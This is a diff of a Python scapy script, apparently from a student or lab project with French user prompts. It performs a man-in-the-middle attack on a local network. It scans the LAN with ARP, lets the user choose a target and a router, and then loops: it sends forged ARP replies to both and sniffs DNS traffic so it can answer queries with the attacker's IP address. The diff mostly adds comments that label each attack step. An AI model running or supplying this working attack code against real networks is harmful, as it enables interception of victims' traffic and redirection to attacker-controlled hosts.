@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 from ipaddress import IPv4Network # Used to check if the IP address entered by the user is valid and also get the IP address of the attacker.
 from scapy import all as scapy # Used to send and receive packets.
 from scapy.layers.inet import IP, UDP
@@ -8,7 +9,7 @@ from struct import pack # Used to get the network mask.
 import os # Used to check if the program is running on my computer or on a VM.
 
 def interfaceChecker():
-    """ Checks if the program is running on my computer or on a VM. 
+    """ Check the name of the computer and return the interface name (it depend of the machine).
     If it is running on my computer, it returns the interface name : 'wlp0s20f3'.
     If it is running on a VM, it returns the interface name : 'enp0s8'.
     """
@@ -56,7 +57,7 @@ def makeARPRequest(ip):
     return answered, unanswered
 
 def forwardDnsSpoofing(spooferIP):
-    """ Returns a function that forwards the DNS request to the DNS server and sends a DNS response to the victim.
+    """ Call `forwardDNS()` function when a DNS request is received. This function is called by `scapy.sniff()` function.
 
     Parameters
     ----------
@@ -68,7 +69,7 @@ def forwardDnsSpoofing(spooferIP):
     function
     """
     def forwardDNS(orgPacket: IP):
-        """ Forwards the DNS request to the DNS server and sends a DNS response to the victim.
+        """ Either send a DNS response with the IP address of the attacker or send a DNS response with the correct IP address of the domain by resolving it with google DNS server.
 
         Parameters
         ----------
@@ -94,6 +95,7 @@ def forwardDnsSpoofing(spooferIP):
 
 def main():
     """ The main function. """
+    ## Initialization
     interface = interfaceChecker()
     netmask = getNetworkMask(interface)
     myIp=scapy.get_if_addr(interface)
@@ -102,6 +104,7 @@ def main():
     ip = address.network_address
     pcs=[]
     addressMask = address.prefixlen
+    ## Get all the IP addresses of the network
     answered, unanswered = makeARPRequest(str(ip)+'/'+str(addressMask))
     for element in answered:
         pcs.append([element[1].hwsrc, element[1].psrc])
@@ -110,15 +113,20 @@ def main():
     for pc in pcs:
         print(str(compteur+1)+ ' - ' + pc[0] + ' ' + pc[1])
         compteur+=1
+    ## Select the target and the router
     cible=input('Entrez le numéro de la cible : ')
     cible=pcs[int(cible)-1]
     print('Vous avez choisi : ' + cible[0] + ' ' + cible[1])
     routeur=input('Entrez le numéro du routeur : ')
     routeur=pcs[int(routeur)-1]
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
-    while True: # The attacker sends an ARP response to the victim and the router and also it checks if the victim is sending a DNS request and if it is, it sends a DNS response to the victim.
+    ## Launch the attack
+    while True:
+        ## Send ARP Poisoning to the target
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
+        ## Send ARP Poisoning to the router
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
+        ## Intercept the DNS request
         scapy.sniff(prn=forwardDnsSpoofing(myIp), filter='udp port 53', iface=interface, store=0, timeout=60, count=1)
 
 if __name__ == '__main__':
